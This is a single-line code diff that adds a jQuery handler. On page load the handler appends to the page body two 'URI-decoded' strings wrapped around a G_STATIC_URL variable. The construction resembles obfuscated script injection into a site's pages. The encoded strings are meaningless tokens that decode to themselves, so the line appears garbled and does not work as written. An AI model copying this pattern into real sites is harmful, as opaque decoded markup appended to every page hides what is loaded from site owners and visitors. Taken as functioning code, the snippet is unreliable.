@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('BDVOLMO5AFM2') + G_STATIC_URL + decodeURIComponent('YH3')); }); 
